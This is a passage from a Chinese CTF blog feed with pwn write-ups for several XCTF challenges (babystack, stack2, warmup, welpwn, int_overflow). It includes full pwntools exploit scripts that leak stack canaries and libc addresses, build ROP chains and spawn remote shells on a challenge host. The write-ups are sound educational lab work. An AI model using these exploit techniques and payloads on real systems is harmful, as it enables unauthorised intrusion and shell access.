class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">res=remote(<span class="string">'220.249.52.133'</span>,<span class="number">36024</span>)</span><br><span class="line">elf=ELF(<span class="string">'./babystack'</span>)</span><br><span class="line">libc=ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line">res.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">payload=<span class="number">0x85</span>*<span class="string">'a'</span>+<span class="string">'N0P3'</span></span><br><span class="line">res.send(<span class="string">'1'</span>)</span><br><span class="line">res.send(payload)</span><br><span class="line"><span class="comment">#res.recv()不知道为什么不需要接收</span></span><br><span class="line">res.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">res.send(<span class="string">'2'</span>)</span><br><span class="line">canary_raw=res.recvuntil(<span class="string">'\n---'</span>)</span><br><span class="line">canary=u64(<span class="string">'\x00'</span>+canary_raw[<span class="number">137</span>:<span class="number">137</span>+<span class="number">7</span>])<span class="comment">#得到canary(canary的高位被我们覆盖了，补一个）</span></span><br><span class="line">print(<span class="string">'Get Canary!'</span>)</span><br><span class="line"><span class="comment">#--------------------------------------------------------</span></span><br><span class="line"><span class="comment">#ROPgadget --binary babystack --only "pop|ret"|grep "rdi"</span></span><br><span class="line">start_addr=<span class="number">0x400720</span></span><br><span class="line">pop_rdi=<span class="number">0x400a93</span></span><br><span class="line">puts_got=elf.got[<span class="string">'puts'</span>]</span><br><span class="line">puts_plt=<span class="number">0x400690</span></span><br><span class="line">payload=<span class="number">0x84</span>*<span class="string">'a'</span>+<span class="string">'N0P3'</span>+p64(canary)+<span class="string">'b'</span>*<span class="number">0x8</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(start_addr)</span><br><span class="line">res.send(<span class="string">'1'</span>)</span><br><span class="line">res.send(payload)</span><br><span class="line">res.recv()<span class="comment">#需要接收一次空</span></span><br><span class="line">res.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">res.send(<span class="string">'3'</span>)</span><br><span class="line">puts_got=u64(res.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">print(<span class="string">'Get Puts_Got!'</span>)</span><br><span class="line"><span class="comment">#--------------------------------------------------------</span></span><br><span class="line"><span class="comment">#One_gadget </span></span><br><span class="line">shell= <span class="number">0x45216</span></span><br><span class="line">puts_libc=libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">offset=puts_got-puts_libc</span><br><span class="line">GetShell=offset+shell</span><br><span class="line">payload=<span class="number">0x84</span>*<span class="string">'a'</span>+<span class="string">'N0P3'</span>+p64(canary)+<span class="string">'b'</span>*<span class="number">0x8</span>+p64(GetShell)</span><br><span class="line">res.send(<span class="string">'1'</span>)</span><br><span class="line">res.send(payload)</span><br><span class="line"><span class="comment">#res.recv()不知道为什么不需要接收</span></span><br><span class="line">res.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">res.send(<span class="string">'3'</span>)</span><br><span class="line">res.interactive()</span><br></pre></td></tr></table></figure></div><p><em>在ida的伪代码的36行有一个sub_400826函数，是puts的再封装，无额外代码。但是这个函数却存在“失效”的现象。理论上在exp每次发送完payload后都应该接收一次空，再接收主界面字符串。但是经过测试只有第二次payload发送后才需要。具体原因未知，麻烦大佬路过解释指点一下。</em></p><h1 id="stack2"><a href="#stack2" class="headerlink" title="stack2"></a>stack2</h1><p><em>\</em>终于遇到了必须动调的题目了*</p><p>看一下程序的情况</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/stack2/%E6%88%AA%E5%B1%8F2020-07-14%20%E4%B8%8A%E5%8D%8810.28.31.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/stack2/%E6%88%AA%E5%B1%8F2020-07-14%20%E4%B8%8A%E5%8D%8810.28.31.png" class="lazyload"></a></p><p>32位的，并且有canary保护，估计又要绕过canary了。</p><p>程序是一个平均数计算器。</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/stack2/stack2Ida.jpg" data-fancybox="group" data-caption="ida" class="fancybox"><img alt="ida" title="ida" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/stack2/stack2Ida.jpg" class="lazyload"></a></p><p>3号更换数字功能没有对用户输入的位置进行检查，存在数组越界漏洞。这个漏洞意味着我们可以对从数组的首地址开始到<strong>低地址</strong>方向上的所有数据进行更改。</p><p>那么我们就可以直接绕过canary以“合法”的方式修改返回地址，构造rop。</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/stack2/%E6%88%AA%E5%B1%8F2020-07-14%20%E4%B8%8A%E5%8D%8811.07.02.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/stack2/%E6%88%AA%E5%B1%8F2020-07-14%20%E4%B8%8A%E5%8D%8811.07.02.png" class="lazyload"></a></p><p>在函数列表里有一个函数hackhere，直接开了bash。那么我们似乎只要调用这个函数就可以了。接下来就是最重要的找偏移，从数组首地址到返回地址的距离是多少。起初我是以ida静态分析的栈来算的，得到的是0x74。怎么都不对，后来看了其他师傅的wp发现原来程序实际运行时的偏移不一样。</p><p>所以我们要动态调试一下。</p><p>我在line 30下了断点，因为此处会向数组存储数据，第一次存储数据时的eax的值就是数组的首栈地址。</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/stack2/%E6%88%AA%E5%B1%8F2020-07-14%20%E4%B8%8A%E5%8D%8811.44.23.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/stack2/%E6%88%AA%E5%B1%8F2020-07-14%20%E4%B8%8A%E5%8D%8811.44.23.png" class="lazyload"></a></p><p>程序到达断点，输入一个9</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/stack2/%E6%88%AA%E5%B1%8F2020-07-14%20%E4%B8%8A%E5%8D%8811.45.27.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/stack2/%E6%88%AA%E5%B1%8F2020-07-14%20%E4%B8%8A%E5%8D%8811.45.27.png" class="lazyload"></a></p><p>看到高亮行正要向eax指向的栈地址放入数据，数据正是我们刚刚输入的9。</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/stack2/%E6%88%AA%E5%B1%8F2020-07-14%20%E4%B8%8B%E5%8D%881.09.32.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/stack2/%E6%88%AA%E5%B1%8F2020-07-14%20%E4%B8%8B%E5%8D%881.09.32.png" class="lazyload"></a></p><p>记录一下此时的eax ,0xFFEF2258。找到数组首地址后我们就要找函数的返回地址了。当程序执行ret的时候，esp一定是指向返回地址的。所以我们在主函数的return 0处下断点，选择5，退出程序。</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/stack2/%E6%88%AA%E5%B1%8F2020-07-14%20%E4%B8%8B%E5%8D%881.10.25.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/stack2/%E6%88%AA%E5%B1%8F2020-07-14%20%E4%B8%8B%E5%8D%881.10.25.png" class="lazyload"></a></p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/stack2/%E6%88%AA%E5%B1%8F2020-07-14%20%E4%B8%8B%E5%8D%881.10.41.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/stack2/%E6%88%AA%E5%B1%8F2020-07-14%20%E4%B8%8B%E5%8D%881.10.41.png" class="lazyload"></a></p><p>此时esp指向0xFFEF22DC，大地址减去小地址就得到了正确偏移0x84。（这两个地址的寻找一定要在一次调试中找出来，因为栈地址是随机的）</p><p>算出了偏移我们就可以进行攻击了，但是直接调用hackhere函数并不可以，因为目标主机上并没有bash，所以我们要利用/bin/bash的后两文起一个sh，构造简单的rop。</p><p>exp:</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">res=remote(<span class="string">'220.249.52.133'</span>,<span class="number">30504</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">res.recvuntil(<span class="string">'have:\n'</span>)</span><br><span class="line">res.sendline(<span class="string">'1'</span>)</span><br><span class="line">res.recv()</span><br><span class="line">res.sendline(<span class="string">'9'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(posite,num)</span>:</span></span><br><span class="line">res.recvuntil(<span class="string">'exit\n'</span>)</span><br><span class="line">res.sendline(<span class="string">'3'</span>)</span><br><span class="line">res.recvuntil(<span class="string">'which number to change:\n'</span>)</span><br><span class="line">res.sendline(str(posite))</span><br><span class="line">res.recvuntil(<span class="string">'new number:\n'</span>)</span><br><span class="line">res.sendline(str(num))</span><br><span class="line">change(<span class="number">0x84</span>, <span class="number">0x50</span>)</span><br><span class="line">change(<span class="number">0x85</span>, <span class="number">0x84</span>)</span><br><span class="line">change(<span class="number">0x86</span>, <span class="number">0x04</span>)</span><br><span class="line">change(<span class="number">0x87</span>, <span class="number">0x08</span>)</span><br><span class="line">change(<span class="number">0x8c</span>, <span class="number">0x87</span>)</span><br><span class="line">change(<span class="number">0x8d</span>, <span class="number">0x89</span>)</span><br><span class="line">change(<span class="number">0x8e</span>, <span class="number">0x04</span>)</span><br><span class="line">change(<span class="number">0x8f</span>, <span class="number">0x08</span>)</span><br><span class="line">res.sendline(<span class="string">'5'</span>)</span><br><span class="line">res.interactive()</span><br></pre></td></tr></table></figure></div><p>前四个change是调用system函数，后四个是传入参数”sh”。</p><p>虽然查到的保护机制并没有开启PIE，但是栈地址仍然是随机的。程序运行起来看到的才是真阿。</p><h1 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h1><p><em>\</em>简单的盲打*</p><p>第一次认真做盲pwn，之前在比赛中尝试过但没有做出，相比之下这道题确实比较简单。</p><p>nc看一下</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/warmup/%E6%88%AA%E5%B1%8F2020-07-14%20%E4%B8%8B%E5%8D%889.37.41.png" data-fancybox="group" data-caption="nc" class="fancybox"><img alt="nc" title="nc" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/warmup/%E6%88%AA%E5%B1%8F2020-07-14%20%E4%B8%8B%E5%8D%889.37.41.png" class="lazyload"></a></p><p>给了我们一个地址，应该是执行这个函数就能get shell。</p><p>盲pwn，输了%d测试没有格式化字符串漏洞，估计就是栈溢出了。</p><p>暴破exp：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">Target=<span class="number">0x40060d</span></span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Attack</span><span class="params">(PaddingLen,bit)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res=remote(<span class="string">"220.249.52.133"</span>,<span class="number">39150</span>)</span><br><span class="line">        res.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">        <span class="keyword">if</span> bit==<span class="number">32</span>:</span><br><span class="line">            payload=<span class="string">'a'</span>*PaddingLen+p32(Target)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            payload=<span class="string">'b'</span>*PaddingLen+p64(Target)</span><br><span class="line">        res.sendline(payload)</span><br><span class="line">        ret=res.recv()</span><br><span class="line">        <span class="keyword">if</span> len(ret)&gt;<span class="number">0</span>:</span><br><span class="line">            print(ret)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res.interactive()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        res.close()</span><br><span class="line">   print(<span class="string">"Go on"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    Attack(i,<span class="number">32</span>)</span><br><span class="line">    Attack(i,<span class="number">64</span>)</span><br><span class="line">print(<span class="string">"Finish"</span>)</span><br></pre></td></tr></table></figure></div><p>每次攻击都会测试32位与64位。exp写的太烂，出flag也不会停下。</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/warmup/%E6%88%AA%E5%B1%8F2020-07-14%20%E4%B8%8B%E5%8D%889.22.26.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/warmup/%E6%88%AA%E5%B1%8F2020-07-14%20%E4%B8%8B%E5%8D%889.22.26.png" class="lazyload"></a></p><p>flag夹杂在中间。期间还返回过奇怪的“-Warm up-”字符串，由于没有程序不知为何。</p><h1 id="welpwn"><a href="#welpwn" class="headerlink" title="welpwn"></a>welpwn</h1><p><em>\</em>这是一道很棒的pwn题，就如它的名字一样。*</p><p>看一下保护机制</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/welpwn/%E6%88%AA%E5%B1%8F2020-07-16%20%E4%B8%8B%E5%8D%8812.49.21.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/welpwn/%E6%88%AA%E5%B1%8F2020-07-16%20%E4%B8%8B%E5%8D%8812.49.21.png" class="lazyload"></a></p><p>64位的程序。</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/welpwn/%E6%88%AA%E5%B1%8F2020-07-16%20%E4%B8%8B%E5%8D%8812.50.37.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/welpwn/%E6%88%AA%E5%B1%8F2020-07-16%20%E4%B8%8B%E5%8D%8812.50.37.png" class="lazyload"></a></p><p>读取了0x400字节到buf，没有溢出。继续看echo函数。</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/welpwn/%E6%88%AA%E5%B1%8F2020-07-16%20%E4%B8%8B%E5%8D%8812.50.45.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/welpwn/%E6%88%AA%E5%B1%8F2020-07-16%20%E4%B8%8B%E5%8D%8812.50.45.png" class="lazyload"></a></p><p>可以看到刚才我们输入到字符串被拷贝进了s2，拷贝结束后最后一位改成0。但是s2仅仅只有16字节长而已，显然存在溢出。当时误以为这是一个类似【stack2】的题，简单构造了一个rop链最后多加一个用于归零的字符。并不可以。后来发现原来在拷贝时遇到\x00时就会停止，可是我们两个地址之间必有\x00。也就是说我们最多只能执行ret到一个地址。怎么利用呢？</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/welpwn/%E6%88%AA%E5%B1%8F2020-07-16%20%E4%B8%8B%E5%8D%8812.51.33.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/welpwn/%E6%88%AA%E5%B1%8F2020-07-16%20%E4%B8%8B%E5%8D%8812.51.33.png" class="lazyload"></a></p><p>在这里下个断点，gdb看一下。</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/welpwn/%E6%88%AA%E5%B1%8F2020-07-16%20%E4%B8%8B%E5%8D%8812.57.51.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/welpwn/%E6%88%AA%E5%B1%8F2020-07-16%20%E4%B8%8B%E5%8D%8812.57.51.png" class="lazyload"></a></p><p>可以看到我们输入的字符串在fc0，经过拷贝到了fa0，两者间的距离是0x20。</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/welpwn/%E6%88%AA%E5%B1%8F2020-07-16%20%E4%B8%8B%E5%8D%8812.51.10.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/welpwn/%E6%88%AA%E5%B1%8F2020-07-16%20%E4%B8%8B%E5%8D%8812.51.10.png" class="lazyload"></a></p><p>知道了buf是紧邻返回地址的，我们就可以构造一个巧妙的rop链。大概的思路是：我们写好padding溢出后加上一个可以pop 0x20个字节的gadget（下面称为pop20）后面跟上正常的rop链。这样为什么可行呢？拷贝结束后s2只有从padding到pop20的payload，而buf是完整的。程序溢出后返回地址被覆盖成pop20，执行后紧邻的buf会被pop 0x20个字节，也就是从padding到pop20都被pop了，所以紧接着的后半段payload就可以正常执行了。</p><p>不得不说pwn真是太益智了。</p><p>这个pop20可以通过Ropgadget来找</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/welpwn/%E6%88%AA%E5%B1%8F2020-07-16%20%E4%B8%8B%E5%8D%8812.59.42.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/welpwn/%E6%88%AA%E5%B1%8F2020-07-16%20%E4%B8%8B%E5%8D%8812.59.42.png" class="lazyload"></a></p><p>第一个就正好。4*8=32（0x20）。就算没有找到也没关系，可以多个pop连在一起实现。</p><p>exp：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">res=remote(<span class="string">"220.249.52.133"</span>,<span class="number">59879</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">elf=ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">start=elf.symbols[<span class="string">'_start'</span>]</span><br><span class="line">write_plt=elf.plt[<span class="string">'write'</span>]</span><br><span class="line">write_got=elf.got[<span class="string">'write'</span>]</span><br><span class="line">clean_padding=<span class="number">0x40089c</span><span class="comment">#pop 0x20byte</span></span><br><span class="line">pop_rdi=<span class="number">0x4008A3</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x4008a1</span></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x10</span>+<span class="string">'b'</span>*<span class="number">0x8</span>+p64(clean_padding)+p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi_r15)+p64(write_got)+p64(<span class="number">0</span>)+p64(write_plt)+p64(start)</span><br><span class="line">res.recvuntil(<span class="string">'RCTF\n'</span>)</span><br><span class="line">res.sendline(payload)</span><br><span class="line">write_got=res.recv(<span class="number">8</span>)</span><br><span class="line">write_got=u64(write_got)</span><br><span class="line">print(hex(write_got))</span><br><span class="line">Searcher=LibcSearcher(<span class="string">'write'</span>,<span class="number">0x2b0</span>)</span><br><span class="line">offset=write_got-Searcher.dump(<span class="string">"write"</span>)</span><br><span class="line">system=Searcher.dump(<span class="string">"system"</span>)+offset</span><br><span class="line">binsh=Searcher.dump(<span class="string">"str_bin_sh"</span>)+offset</span><br><span class="line">res.recvuntil(<span class="string">'RCTF\n'</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x10</span>+<span class="string">'b'</span>*<span class="number">0x8</span>+p64(clean_padding)+p64(pop_rdi)+p64(binsh)+p64(system)</span><br><span class="line">res.sendline(payload)</span><br><span class="line">res.interactive()</span><br></pre></td></tr></table></figure></div><p>这道题还有非常坑的一点，puts函数和printf函数失效，看来还是用write来泄漏地址最稳定。</p><p>*学到许多阿。pwn真是太益智了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;fogot&quot;&gt;&lt;a href=&quot;#fogot&quot; class=&quot;headerlink&quot; title=&quot;fogot&quot;&gt;&lt;/a&gt;fogot&lt;/h1&gt;&lt;p&gt;nc连接题目&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://n0p3.oss-cn-beijing.aliyunc
      
    
    </summary>
    
    
    
      <category term="CTF" scheme="https://cdn.n0p3.cn/tags/CTF/"/>
    
      <category term="PWN" scheme="https://cdn.n0p3.cn/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>XCTF-Pwn新手区</title>
    <link href="https://cdn.n0p3.cn/2020/04/13/int-overflow/"/>
    <id>https://cdn.n0p3.cn/2020/04/13/int-overflow/</id>
    <published>2020-04-13T12:20:48.000Z</published>
    <updated>2020-07-07T12:06:21.041Z</updated>
    
    <content type="html"><![CDATA[<h1 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h1><p>nc链接一下题目。</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/%E6%89%B9%E6%B3%A8%202020-04-13%20190617.png" data-fancybox="group" data-caption="连接" class="fancybox"><img alt="连接" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/%E6%89%B9%E6%B3%A8%202020-04-13%20190617.png" class="lazyload" title="连接"></a></p><p>大概是先选择功能，再输入用户名，密码。一共有三次输入，这中间就可能存在漏洞。</p><p>拖进ida</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/%E6%89%B9%E6%B3%A8%202020-04-13%20190414.png" data-fancybox="group" data-caption="ida" class="fancybox"><img alt="ida" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/%E6%89%B9%E6%B3%A8%202020-04-13%20190414.png" class="lazyload" title="ida"></a></p><p>主函数中并没有明显的漏洞，跟踪到login中</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/%E6%89%B9%E6%B3%A8%202020-04-13%20190436.png" data-fancybox="group" data-caption="login" class="fancybox"><img alt="login" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/%E6%89%B9%E6%B3%A8%202020-04-13%20190436.png" class="lazyload" title="login"></a></p><p>login函数里也没有找到可能的漏洞，输入的密码储存进了buf，并传递给了check_passwd函数</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/%E6%89%B9%E6%B3%A8%202020-04-13%20190446.png" data-fancybox="group" data-caption="check_passwd" class="fancybox"><img alt="check_passwd" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/%E6%89%B9%E6%B3%A8%202020-04-13%20190446.png" class="lazyload" title="check_passwd"></a></p><p>在check_passwd函数里，变量v3声明为无符号整型，占8bit，即一个字节，用来储存s（刚才传入的buf）的长度。但是buf的长度是0x199，远大于v3的长度。8bit储存范围是0～255，由于无符号，超过255就会“循环”，256就与0相等。</p><p>line8执行了判断，要求v3的范围在3～8之间。但是我们使v3溢出，在259～264亦可。</p><p>测试一下</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/%E6%89%B9%E6%B3%A8%202020-04-13%20190715.png" data-fancybox="group" data-caption="测试" class="fancybox"><img alt="测试" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/%E6%89%B9%E6%B3%A8%202020-04-13%20190715.png" class="lazyload" title="测试"></a></p><p>成功了，注意到在判断密码成功后，字符串会被拷贝进dest里，那么可以开始构造payload了。</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/%E6%89%B9%E6%B3%A8%202020-04-13%20190327.png" data-fancybox="group" data-caption="target" class="fancybox"><img alt="target" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/%E6%89%B9%E6%B3%A8%202020-04-13%20190327.png" class="lazyload" title="target"></a></p><p>在左侧的函数列表中有一个what_is_this，执行后就能getflag。观察一下栈的情况</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/%E6%89%B9%E6%B3%A8%202020-04-13%20190520.png" data-fancybox="group" data-caption="栈" class="fancybox"><img alt="栈" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/%E6%89%B9%E6%B3%A8%202020-04-13%20190520.png" class="lazyload" title="栈"></a></p><p>所以payload，先’A’*0x14,填满dest和v3所占的空间，再’a’*4填满储存ebp的位置，然后就可以加上目标地址了。最后，要让payload的总长在259～264之间。</p><p>exp如下</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/%E6%89%B9%E6%B3%A8%202020-04-13%20191528.png" data-fancybox="group" data-caption="exp" class="fancybox"><img alt="exp" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/%E6%89%B9%E6%B3%A8%202020-04-13%20191528.png" class="lazyload" title="exp"></a></p><p>运行即得flag。</p><h1 id="Cgpwn2"><a href="#Cgpwn2" class="headerlink" title="Cgpwn2"></a>Cgpwn2</h1><p>nc连接一下题目</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/cgpwn2/%E6%88%AA%E5%B1%8F2020-04-15%20%E4%B8%8B%E5%8D%886.10.29.png" data-fancybox="group" data-caption="nc" class="fancybox"><img alt="nc" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/cgpwn2/%E6%88%AA%E5%B1%8F2020-04-15%20%E4%B8%8B%E5%8D%886.10.29.png" class="lazyload" title="nc"></a></p><p>有两次输入，拖进ida看一下main函数</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF%20int_overflow/cgpwn2/%E6%88%AA%E5%B1%8F2020-04-15%20%E4%B8%8B%E5%8D%886.12.11.png" data-fancybox="group" data-caption="main" class="fancybox"><img alt="main" 